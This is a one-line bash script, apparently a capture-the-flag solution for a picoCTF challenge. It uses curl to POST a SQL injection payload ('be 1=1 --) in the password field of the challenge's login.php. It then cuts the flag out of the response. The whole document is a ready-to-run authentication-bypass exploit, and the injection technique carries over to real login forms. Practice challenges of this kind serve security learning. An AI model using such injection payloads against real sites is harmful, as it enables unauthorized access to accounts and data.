#!/bin/bash
#get flag script 2023:07:07
#Creator 0xtheM7
curl -X POST -d "password='be 1=1 --&debug=0" http://jupiter.challenges.picoctf.org:54253/login.php --silent | cut -d ":" -f2 | cut -d "<" -f1 | cut -d " " -f2 
